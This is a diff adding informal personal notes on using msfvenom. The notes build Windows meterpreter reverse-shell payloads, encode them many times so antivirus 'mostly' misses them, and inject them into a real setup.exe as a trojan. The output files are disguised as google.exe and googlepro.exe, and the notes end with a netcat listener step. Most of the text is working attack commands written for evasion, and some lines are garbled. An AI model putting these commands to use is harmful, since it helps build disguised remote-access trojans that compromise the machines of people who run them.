@@ -1,0 +1,27 @@
+msfvenom --help
+msfvenom -l encoders "without ' - '  " have payloads nops encrypt
+
+
+msfvenom -p (payload) -e(encoder) -a(architecture)  -platform(windows or etc) -i(iteration no of times to encode a payload) -x (template- usually second part.) -o (outputfile) 
+
+------------->is not detected mostly....
+command is used with x86 arch
+and setup should be x86 to attach with
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=444 -k -e x86/shikata_ga_nai -i 10(times) -f exe > google.exe
+------------->
+now we use polymorphic and metamorphic payloads and put it in some exe file.
+now. l
+
+we will use shikatata_ga_nai as raw file so it would be in bin format .
+command is
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=444  -e x86/shikata_ga_nai -i 10 -f raw >google.bin
+
+now as we use real setup.exe file and put the stuff in it
+so 
+msfvenom -p - -x(the real setup x86)/root/Desktop/setup.exe -k(to inject new thread ) -f exe -a x86 --platform windows -e x86/bloxor -i 5 >googlepro.exe (payload append in that we created up^there) <google.bin
+
+
+---------->
+net cat
+nc -l lport and lhost to get target find more on net
